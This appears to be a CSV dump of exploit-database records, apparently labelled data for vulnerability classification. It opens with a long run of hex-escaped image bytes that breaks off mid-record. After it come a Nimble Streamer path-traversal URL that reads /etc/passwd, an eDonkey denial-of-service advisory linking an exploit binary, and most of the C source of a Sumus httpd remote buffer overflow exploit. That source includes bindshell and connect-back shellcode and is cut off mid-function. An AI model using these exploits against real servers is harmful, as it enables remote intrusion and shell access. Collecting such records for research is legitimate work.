""\xA7\x97\xF3\x7E\x8A\xDE\x14\xEF\x29\xE2\x29\x1B\xA6\x34\x4C\xB9\x31\x65\x5C\x6B""+ ""\xAA\x96\x97\x96\x58\xAB\x48\xAB\x51\xAB\x47\xEB\xBD\x36\xAE\xED\xA7\x9D\xA6\xBD""+ ""\x45\xBB\x59\xFB\x81\x0E\x41\xC7\x4A\x27\x5C\x27\x47\x67\x8F\xCE\x05\x9D\xE7\x53""+ ""\xD9\x53\xDD\xA7\x0A\xA7\x16\x4D\x3D\x3A\xF5\xAE\x2E\xAA\x6B\xA5\x1B\xA1\xBB\x44""+ ""\x77\xBF\x6E\xA7\xEE\x98\x9E\xBE\x5E\x80\x9E\x4C\x6F\xA7\xDE\x79\xBD\xE7\xFA\x1C""+ ""\x7D\x2F\xFD\x54\xFD\x6D\xFA\xA7\xF5\x47\x0C\x58\x06\xB3\x0C\x24\x06\xDB\x0C\xCE""+ ""\x18\x3C\xC5\x35\x71\x6F\x3C\x1D\x2F\xC7\xDB\xF1\x51\x43\x5D\xC3\x40\x43\xA5\x61""+ ""\x95\x61\x97\xE1\x84\x91\xB9\xD1\x3C\xA3\xD5\x46\x8D\x46\x0F\x8C\x69\xC6\x5C\xE3""+ ""\x24\xE3\x6D\xC6\x6D\xC6\xA3\x26\x06\x26\x21\x26\x4B\x4D\xEA\x4D\xEE\x9A\x52\x4D""+ ""\xB9\xA6\x29\xA6\x3B\x4C\x3B\x4C\xC7\xCD\xCC\xCD\xA2\xCD\xD6\x99\x35\x9B\x3D\x31""+ ""\xD7\x32\xE7\x9B\xE7\x9B\xD7\x9B\xDF\xB7\x60\x5A\x78\x5A\x2C\xB6\xA8\xB6\xB8\x65""+ ""\x49\xB2\xE4\x5A\xA6\x59\xEE\xB6\xBC\x6E\x85\x5A\x39\x59\xA5\x58\x55\x5A\x5D\xB3""+ ""\x46\xAD\x9D\xAD\x25\xD6\xBB\xAD\xBB\xA7\x11\xA7\xB9\x4E\x93\x4E\xAB\x9E\xD6\x67""+ ""\xC3\xB0\xF1\xB6\xC9\xB6\xA9\xB7\x19\xB0\xE5\xD8\x06\xDB\xAE\xB6\x6D\xB6\x7D\x61""+ ""\x67\x62\x17\x67\xB7\xC5\xAE\xC3\xEE\x93\xBD\x93\x7D\xBA\x7D\x8D\xFD\x3D\x07\x0D""+ ""\x87\xD9\x0E\xAB\x1D\x5A\x1D\x7E\x73\xB4\x72\x14\x3A\x56\x3A\xDE\x9A\xCE\x9C\xEE""+ ""\x3F\x7D\xC5\xF4\x96\xE9\x2F\x67\x58\xCF\x10\xCF\xD8\x33\xE3\xB6\x13\xCB\x29\xC4""+ ""\x69\x9D\x53\x9B\xD3\x47\x67\x17\x67\xB9\x73\x83\xF3\x88\x8B\x89\x4B\x82\xCB\x2E""+ ""\x97\x3E\x2E\x9B\x1B\xC6\xDD\xC8\xBD\xE4\x4A\x74\xF5\x71\x5D\xE1\x7A\xD2\xF5\x9D""+ ""\x9B\xB3\x9B\xC2\xED\xA8\xDB\xAF\xEE\x36\xEE\x69\xEE\x87\xDC\x9F\xCC\x34\x9F\x29""+ ""\x9E\x59\x33\x73\xD0\xC3\xC8\x43\xE0\x51\xE5\xD1\x3F\x0B\x9F\x95\x30\x6B\xDF\xAC""+ ""\x7E\x4F\x43\x4F\x81\x67\xB5\xE7\x23\x2F\x63\x2F\x91\x57\xAD\xD7\xB0\xB7\xA5\x77""+ ""\xAA\xF7\x61\xEF\x17\x3E\xF6\x3E\x72\x9F\xE3\x3E\xE3\x3C\x37\xDE\x32\xDE\x59\x5F""+ ""\xCC\x37\xC0\xB7\xC8\xB7\xCB\x4F\xC3\x6F\x9E\x5F\x85\xDF\x43\x7F\x23\xFF\x64\xFF""+ ""\x7A\xFF\xD1\x00\xA7\x80\x25\x01\x67\x03\x89\x81\x41\x81\x5B\x02\xFB\xF8\x7A\x7C""+ ""\x21\xBF\x8E\x3F\x3A\xDB\x65\xF6\xB2\xD9\xED\x41\x8C\xA0\xB9\x41\x15\x41\x8F\x82""+ ""\xAD\x82\xE5\xC1\xAD\x21\x68\xC8\xEC\x90\xAD\x21\xF7\xE7\x98\xCE\x91\xCE\x69\x0E""+ ""\x85\x50\x7E\xE8\xD6\xD0\x07\x61\xE6\x61\x8B\xC3\x7E\x0C\x27\x85\x87\x85\x57\x86""+ ""\x3F\x8E\x70\x88\x58\x1A\xD1\x31\x97\x35\x77\xD1\xDC\x43\x73\xDF\x44\xFA\x44\x96""+ ""\x44\xDE\x9B\x67\x31\x4F\x39\xAF\x2D\x4A\x35\x2A\x3E\xAA\x2E\x6A\x3C\xDA\x37\xBA""+ ""\x34\xBA\x3F\xC6\x2E\x66\x59\xCC\xD5\x58\x9D\x58\x49\x6C\x4B\x1C\x39\x2E\x2A\xAE""+ ""\x36\x6E\x6C\xBE\xDF\xFC\xED\xF3\x87\xE2\x9D\xE2\x0B\xE3\x7B\x17\x98\x2F\xC8\x5D""+ ""\x70\x79\xA1\xCE\xC2\xF4\x85\xA7\x16\xA9\x2E\x12\x2C\x3A\x96\x40\x4C\x88\x4E\x38""+ ""\x94\xF0\x41\x10\x2A\xA8\x16\x8C\x25\xF2\x13\x77\x25\x8E\x0A\x79\xC2\x1D\xC2\x67""+ ""\x22\x2F\xD1\x36\xD1\x88\xD8\x43\x5C\x2A\x1E\x4E\xF2\x48\x2A\x4D\x7A\x92\xEC\x91""+ ""\xBC\x35\x79\x24\xC5\x33\xA5\x2C\xE5\xB9\x84\x27\xA9\x90\xBC\x4C\x0D\x4C\xDD\x9B""+ ""\x3A\x9E\x16\x9A\x76\x20\x6D\x32\x3D\x3A\xBD\x31\x83\x92\x91\x90\x71\x42\xAA\x21""+ ""\x4D\x93\xB6\x67\xEA\x67\xE6\x66\x76\xCB\xAC\x65\x85\xB2\xFE\xC5\x6E\x8B\xB7\x2F""+ ""\x1E\x95\x07\xC9\x6B\xB3\x90\xAC\x05\x59\x2D\x0A\xB6\x42\xA6\xE8\x54\x5A\x28\xD7""+ ""\x2A\x07\xB2\x67\x65\x57\x66\xBF\xCD\x89\xCA\x39\x96\xAB\x9E\x2B\xCD\xED\xCC\xB3""+ ""\xCA\xDB\x90\x37\x9C\xEF\x9F\xFF\xED\x12\xC2\x12\xE1\x92\xB6\xA5\x86\x4B\x57\x2D""+ ""\x1D\x58\xE6\xBD\xAC\x6A\x39\xB2\x3C\x71\x79\xDB\x0A\xE3\x15\x05\x2B\x86\x56\x06""+ ""\xAC\x3C\xB8\x8A\xB6\x2A\x6D\xD5\x4F\xAB\xED\x57\x97\xAE\x7E\xBD\x26\x7A\x4D\x6B""+ ""\x81\x5E\xC1\xCA\x82\xC1\xB5\x01\x6B\xEB\x0B\x55\x0A\xE5\x85\x7D\xEB\xDC\xD7\xED""+ ""\x5D\x4F\x58\x2F\x59\xDF\xB5\x61\xFA\x86\x9D\x1B\x3E\x15\x89\x8A\xAE\x14\xDB\x17""+ ""\x97\x15\x7F\xD8\x28\xDC\x78\xE5\x1B\x87\x6F\xCA\xBF\x99\xDC\x94\xB4\xA9\xAB\xC4""+ ""\xB9\x64\xCF\x66\xD2\x66\xE9\xE6\xDE\x2D\x9E\x5B\x0E\x96\xAA\x97\xE6\x97\x0E\x6E""+ ""\x0D\xD9\xDA\xB4\x0D\xDF\x56\xB4\xED\xF5\xF6\x45\xDB\x2F\x97\xCD\x28\xDB\xBB\x83""+ ""\xB6\x43\xB9\xA3\xBF\x3C\xB8\xBC\x65\xA7\xC9\xCE\xCD\x3B\x3F\x54\xA4\x54\xF4\x54""+ ""\xFA\x54\x36\xEE\xD2\xDD\xB5\x61\xD7\xF8\x6E\xD1\xEE\x1B\x7B\xBC\xF6\x34\xEC\xD5""+ ""\xDB\x5B\xBC\xF7\xFD\x3E\xC9\xBE\xDB\x55\x01\x55\x4D\xD5\x66\xD5\x65\xFB\x49\xFB""+ ""\xB3\xF7\x3F\xAE\x89\xAA\xE9\xF8\x96\xFB\x6D\x5D\xAD\x4E\x6D\x71\xED\xC7\x03\xD2""+ ""\x03\xFD\x07\x23\x0E\xB6\xD7\xB9\xD4\xD5\x1D\xD2\x3D\x54\x52\x8F\xD6\x2B\xEB\x47""+ ""\x0E\xC7\x1F\xBE\xFE\x9D\xEF\x77\x2D\x0D\x36\x0D\x55\x8D\x9C\xC6\xE2\x23\x70\x44""+ ""\x79\xE4\xE9\xF7\x09\xDF\xF7\x1E\x0D\x3A\xDA\x76\x8C\x7B\xAC\xE1\x07\xD3\x1F\x76""+ ""\x1D\x67\x1D\x2F\x6A\x42\x9A\xF2\x9A\x46\x9B\x53\x9A\xFB\x5B\x62\x5B\xBA\x4F\xCC""+ ""\x3E\xD1\xD6\xEA\xDE\x7A\xFC\x47\xDB\x1F\x0F\x9C\x34\x3C\x59\x79\x4A\xF3\x54\xC9""+ ""\x69\xDA\xE9\x82\xD3\x93\x67\xF2\xCF\x8C\x9D\x95\x9D\x7D\x7E\x2E\xF9\xDC\x60\xDB""+ ""\xA2\xB6\x7B\xE7\x63\xCE\xDF\x6A\x0F\x6F\xEF\xBA\x10\x74\xE1\xD2\x45\xFF\x8B\xE7""+ ""\x3B\xBC\x3B\xCE\x5C\xF2\xB8\x74\xF2\xB2\xDB\xE5\x13\x57\xB8\x57\x9A\xAF\x3A\x5F""+ ""\x6D\xEA\x74\xEA\x3C\xFE\x93\xD3\x4F\xC7\xBB\x9C\xBB\x9A\xAE\xB9\x5C\x6B\xB9\xEE""+ ""\x7A\xBD\xB5\x7B\x66\xF7\xE9\x1B\x9E\x37\xCE\xDD\xF4\xBD\x79\xF1\x16\xFF\xD6\xD5""+ ""\x9E\x39\x3D\xDD\xBD\xF3\x7A\x6F\xF7\xC5\xF7\xF5\xDF\x16\xDD\x7E\x72\x27\xFD\xCE""+ ""\xCB\xBB\xD9\x77\x27\xEE\xAD\xBC\x4F\xBC\x5F\xF4\x40\xED\x41\xD9\x43\xDD\x87\xD5""+ ""\x3F\x5B\xFE\xDC\xD8\xEF\xDC\x7F\x6A\xC0\x77\xA0\xF3\xD1\xDC\x47\xF7\x06\x85\x83""+ ""\xCF\xFE\x91\xF5\x8F\x0F\x43\x05\x8F\x99\x8F\xCB\x86\x0D\x86\xEB\x9E\x38\x3E\x39""+ ""\x39\xE2\x3F\x72\xFD\xE9\xFC\xA7\x43\xCF\x64\xCF\x26\x9E\x17\xFE\xA2\xFE\xCB\xAE""+ ""\x17\x16\x2F\x7E\xF8\xD5\xEB\xD7\xCE\xD1\x98\xD1\xA1\x97\xF2\x97\x93\xBF\x6D\x7C""+ ""\xA5\xFD\xEA\xC0\xEB\x19\xAF\xDB\xC6\xC2\xC6\x1E\xBE\xC9\x78\x33\x31\x5E\xF4\x56""+ ""\xFB\xED\xC1\x77\xDC\x77\x1D\xEF\xA3\xDF\x0F\x4F\xE4\x7C\x20\x7F\x28\xFF\x68\xF9""+ ""\xB1\xF5\x53\xD0\xA7\xFB\x93\x19\x93\x93\xFF\x04\x03\x98\xF3\xFC\x63\x33\x2D\xDB""+ ""\x00\x00\x00\x20\x63\x48\x52\x4D\x00\x00\x7A\x25\x00\x00\x80\x83\x00\x00\xF9\xFF""+ ""\x00\x00\x80\xE9\x00\x00\x75\x30\x00\x00\xEA\x60\x00\x00\x3A\x98\x00\x00\x17\x6F""+ ""\x92\x5F\xC5\x46\x00\x00\x03\x00\x50\x4C\x54\x45\x00\x00\x00\xFF\xFF\xFF\x02\x02""+ ""\x02\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x72\xB2\x02\x4A\x00\x00\x00\x04\x74\x52\x4E\x53\xFF\xFF\xFF\x00\x40\x2A\xA9\xF4""+ ""\x00\x00\x0B\x0B\x49\x44\x41\x54\x78\xDA\xEC\xDD\xB1\x09\x00\x20\x0C\x45\x41\x23""+ ""\xEE\x3F\xB2\x5A\xD8\x0B\x8A\x85\x90\xBB\x11\x7E\xF3\x48\x95\x52\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\",,
,,,
,,0,
47301,"Nimble Streamer 3.0.2-2 < 3.5.4-9 - Directory Traversal # Nimble Streamer 3.0.2-2 to 3.5.4-9 - Path Traversal # Exploit Author: MAYASEVEN # Source at ""https://mayaseven.com/nimble-directory-traversal-in-nimble-streamer-version-3-0-2-2-to-3-5-4-9/"" # Published on 08/04/2019 # Vendor Homepage at ""https://wmspanel.com/nimble"" # Affected Version 3.0.2-2 to 3.5.4-9 # Tested on 3.5.4-9 # CVE-2019-11013 Nimble Streamer 3.0.2-2 to 3.5.4-9 Path Traversal # Description: Nimble Streamer 3.0.2-2 through 3.5.4-9 has a ../ directory traversal vulnerability. #              Successful exploitation could allow an attacker to traverse the file system to access #              files or directories that are outside of the restricted directory on the remote server.   POC :  - http://somesite.com/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448",Directory Traversal,1
22395,eDonkey Clients 0.44/0.45 - Multiple Chat Dialog Resource Consumption Vulnerabilities source: https://www.securityfocus.com/bid/7164/info  A vulnerability has been reported for eDonkey clients for Windows that will result in a denial of service condition.  The vulnerability occurs when numerous chat dialog boxes are opened by the eDonkey or Overnet clients. Every open chat dialog box will consume a small amount of memory and CPU cycles.   An attacker can exploit this vulnerability by connecting to a vulnerable eDonkey user and issuing numerous chat requests.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/22395.zip,Chat Dialog Resource Consumption Vulnerabilities,1
940,"Sumus 0.2.2 - HTTPd Remote Buffer Overflow /*[ sumus[v0.2.2]: (httpd) remote buffer overflow exploit. ]****   *                                                             *   * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)            *   *                                                             *   * compile:                                                    *   *  gcc xsumus.c -o xsumus                                     *   *                                                             *   * syntax:                                                     *   *  ./xsumus [-pscrln] -h host                                 *   *                                                             *   * sumus homepage/url:                                         *   *  http://sumus.sourceforge.net                               *   *                                                             *   * Mus is a Spanish cards game played by 4 folks around a      *   * table. SUMUS is a server for playing mus over Internet. The *   * project is just the server, but Java applet and Linux       *   * console clients are provided.                               *   *                                                             *   * SUMUS contains a remotely exploitable buffer overflow in    *   * the httpd portion of its server code, which runs            *   * automatically upon starting the SUMUS server(usually port   *   * 81).                                                        *   *                                                             *   * the overflow itself occurs on the stack, but it isn't quite *   * cut and dry as normal.  this overflow occurs in a while()   *    * byte-by-byte write loop, and the integers used in the loop  *   * get overwritten before it makes it to the eip/return        *   * address.  this is best explained by viewing the code        *   * itself:                                                     *   *                                                             *   * ----------------------------------------------------------- *   * char Buffer[65536] ;                                        *   * ...                                                         *   * k = recv( SocketWebPendientes[ j ], Buffer, 20480, 0 ) ;    *   * if( k > 0 )                                                 *   *  RespondeHTTPPendiente( j ) ;                               *   * ...                                                         *   * void RespondeHTTPPendiente( int Pos )                       *   * {                                                           *   *  int j ,kk ,faltan ;                                        *   *  char tmpCad[100], *p1, *p2 ;                               *   *  FILE *f ;                                                  *   *                                                             *   *  Buffer[400] = 0 ;                                          *   *  p1 = strstr( Buffer, ""GET"" ) ;                             *   *  if( p1 == NULL ) p1 = strstr( Buffer, ""Get"" ) ;            *   *  if( p1 == NULL ) p1 = strstr( Buffer, ""get"" ) ;            *   *  if( p1 != NULL )                                           *   *   {                                                         *   *    j = 5 ;                                                  *   *    kk = 0 ;                                                 *   *    if( j < strlen(p1) )                                     *   *      while ( p1[j] != ' ' && p1[j] )                        *   * 	tmpCad[kk++] = p1[j++] ;                                *   *    tmpCad[kk] = 0 ;                                         *   *   }                                                         *   * ...                                                         *   * ----------------------------------------------------------- *   *                                                             *   * as you can see this makes for a special situation.  the     *   * best method i came up with was to format the buffer like    *   * so:                                                         *   *  [400 bytes]                             | [20000 bytes]    *   *  [FILLER][""GET""][FILLER][new ""kk""][ADDR] | [EGG/SHELLCODE]  *   *                                                             *   * this way since the new ""kk""/addr ends right the 400         *   * boundary point, only the overwritten ""kk"" integer needs to  *   * be worried about(and not the ""j"" integer as well).          *   *                                                             *   * i mainly made this because it was a moderatly different     *   * exploit method than the norm.  figured i'd see if it could  *   * be done, and here we are.                                   *   *                                                             *   * tested with default values(on static binary):               *   * + gentoo-r5           : successful.                         *   * + mandrake9.1/default : successful.                         *   * + mandrake9.1/secure  : failed.                             *   * + fedora core2        : successful.                         *   ***************************************************************/ #include <stdio.h> #include <stdlib.h> #ifndef __USE_BSD #define __USE_BSD #endif #include <string.h> #include <strings.h> #include <signal.h> #include <unistd.h> #include <netdb.h> #include <getopt.h> #include <sys/socket.h> #include <sys/types.h> #include <sys/time.h> #include <netinet/in.h> #include <arpa/inet.h>  #define BUFSIZE 399 #define EGGSIZE 20000 #define TIMEOUT 10 #define DFL_PORT 81 #define DFL_SPORT 7979 #define DFL_RETADDR 0x0805a001 #define DFL_LOCT_KK 105 #define DFL_JUMP_KK 10  /* globals. */ static char x86_bind[]= /* bindshell, from netric. */  ""\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66""  ""\xcd\x80\x31\xd2\x52\x66\x68\xff\xff\x43\x66\x53\x89""  ""\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89""  ""\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52""  ""\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80""  ""\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68""  ""\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd""  ""\x80""; static char x86_conn[]= /* connect-back, eSDee/netric. */  ""\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51""  ""\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2""  ""\x31\xc0\x31\xc9\x51\x51\x68\xff\xff\xff\xff\x66\x68""  ""\xff\xff\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52""  ""\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x74""  ""\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3""  ""\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31""  ""\xc0\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2""  ""\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3""  ""\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd""  ""\x80""; char *x86_ptr; struct{  unsigned char new_kk;  signed short loct_kk;  unsigned int addr;  char *host;  unsigned short port;  unsigned short sport; }tbl;  /* lonely extern. */ extern char *optarg;  /* functions. */ char *getbuf(unsigned int); char *getegg(unsigned int); unsigned short sumus_connect(char *,unsigned short); void getshell(char *,unsigned short); signed int getshell_bind_init(unsigned short); signed int getshell_bind_accept(signed int); signed int getshell_conn(char *,unsigned short); void proc_shell(signed int); void printe(char *,short); void usage(char *); void sig_alarm(){printe(""alarm/timeout hit."",1);}  /* start. */ int main(int argc,char **argv){  unsigned char tmp_new=0;  signed int chr=0,rsock=0;  unsigned int bs=0;  struct hostent *t;  in_addr_t s=0;  printf(""[*] sumus[v0.2.2]: (httpd) remote buffer overflow explo""  ""it.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n"");  tbl.port=DFL_PORT;  tbl.sport=DFL_SPORT;  tbl.addr=DFL_RETADDR;  tbl.loct_kk=DFL_LOCT_KK;  while((chr=getopt(argc,argv,""h:p:s:c:r:l:n:""))!=EOF){   switch(chr){    case 'h':     if(!tbl.host&&!(tbl.host=(char *)strdup(optarg)))      printe(""main(): allocating memory failed"",1);       break;    case 'p':     tbl.port=atoi(optarg);     break;    case 's':     tbl.sport=atoi(optarg);     break;    case 'c':     if((s=inet_addr(optarg))){      if((t=gethostbyname(optarg)))       memcpy((char *)&s,(char *)t->h_addr,sizeof(s));      if(s==-1)s=0;      if(!s)printe(""invalid host/ip. (-c option)"",0);     }     break;    case 'r':     sscanf(optarg,""%x"",&tbl.addr);     break;    case 'l':     tbl.loct_kk=atoi(optarg);     break;    case 'n':     tmp_new=atoi(optarg);     break;    default:     usage(argv[0]);     break;   }  }  if(!tbl.host)usage(argv[0]);  if(tbl.loct_kk<0||tbl.loct_kk>BUFSIZE)tbl.loct_kk=DFL_LOCT_KK;  /* set bind port for shellcode. */  if(!s){   bs=strlen(x86_bind);   x86_bind[20]=(tbl.sport&0xff00)>>8;   x86_bind[21]=(tbl.sport&0x00ff);   x86_ptr=x86_bind;  }  /* set connect-back ip/port for shellcode. */  else{   bs=strlen(x86_conn);   x86_conn[33]=(s&0x000000ff);   x86_conn[34]=(s&0x0000ff00)>>8;   x86_conn[35]=(s&0x00ff0000)>>16;   x86_conn[36]=(s&0xff000000)>>24;   x86_conn[39]=(tbl.sport&0xff00)>>8;   x86_conn[40]=(tbl.sport&0x00ff);   x86_ptr=x86_conn;  }  if(bs!=strlen(x86_ptr))   printe(""ip(-c option) and/or port(-s option) appear to contain a ""   ""null-byte, try again."",1);  tbl.new_kk=(tbl.loct_kk+(tmp_new?tmp_new:DFL_JUMP_KK));  if(!tbl.new_kk)   printe(""ip(-l/-n option) made the overwritten \""kk\"" integer a ""   ""null-byte."",1);  printf(""[*] target\t\t\t: %s:%d\n"",tbl.host,tbl.port);  printf(""[*] shellcode type\t\t: %s(port=%d)\n"",  (s?""connect-back"":""bindshell""),tbl.sport);  printf(""[*] return address($eip)\t: 0x%.8x\n"",tbl.addr);  printf(""[*] overwritten \""kk\"" int value\t: ""  ""%u(0x%.2x)\n"",tbl.new_kk,tbl.new_kk);  printf(""[*] overflow size\t\t: %u(tot=%u) byte(s)\n"",  tbl.loct_kk,BUFSIZE);  printf(""[*] egg size\t\t\t: %u byte(s)\n\n"",EGGSIZE);  if(s){   rsock=getshell_bind_init(tbl.sport);   sumus_connect(tbl.host,tbl.port);   rsock=getshell_bind_accept(rsock);  }  else{   sumus_connect(tbl.host,tbl.port);   rsock=getshell_conn(tbl.host,tbl.sport);  }  if(rsock>0)proc_shell(rsock);  exit(0); } char *getbuf(unsigned int addr){  char *buf;  if(!(buf=(char *)malloc(BUFSIZE+1)))   printe(""getbuf(): allocating memory failed."",1);  /* 0x08 helps hide the appearance of a giant string, */  /* for the server side display.                      */  memset(buf,0x08,BUFSIZE);  memcpy(buf+(BUFSIZE-tbl.loct_kk-9),""GET"",3);  /* this will overwrite the ""kk"" integer of the sumus server. */  buf[BUFSIZE-5]=tbl.new_kk;  /* the address/value used to write in the while() loop right */  /* after the ""kk"" integer has been overwritten/changed. */  *(long *)&buf[BUFSIZE-4]=addr;  buf[BUFSIZE]='\n';  return(buf); } char *getegg(unsigned int size){  char *buf;  if(!(buf=(char *)malloc(size+1)))   printe(""getegg(): allocating memory failed"",1);  memset(buf,0x90,(size-strlen(x86_ptr)));  memcpy(buf+(size-strlen(x86_ptr)),x86_ptr,  strlen(x86_ptr));  return(buf); } unsigned short sumus_connect(char *hostname,unsigned short port){  signed int sock;  struct hostent *t;  struct sockaddr_in s;  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);  s.sin_family=AF_INET;  s.sin_port=htons(port);  printf(""[*] attempting to connect: %s:%d.\n"",hostname,port);  if((s.sin_addr.s_addr=inet_addr(hostname))){   if(!(t=gethostbyname(hostname)))    printe(""couldn't resolve hostname."",1);   memcpy((char *)&s.sin_addr,(char *)t->h_addr,sizeof(s.sin_addr));  }  signal(SIGALRM,sig_alarm);  alarm(TIMEOUT);  if(connect(sock,(struct sockaddr *)&s,sizeof(s)))   printe(""sumus connection failed."",1);  alarm(0);  printf(""[*] successfully connected: %s:%d.\n"",hostname,port);  printf(""[*] sending string: [FILLER][\""GET\""][FILLER][new \""kk\""]""  ""[ADDR][EGG]\n"");  sleep(1);  write(sock,getbuf(tbl.addr),BUFSIZE);  write(sock,getegg(EGGSIZE),EGGSIZE);  sleep(1);  printf(""[*] closing connection.\n\n"");  close(sock);  return(0); } signed int getshell_bind_init(unsigned short port){  signed int ssock=0,so=1;  struct sockaddr_in 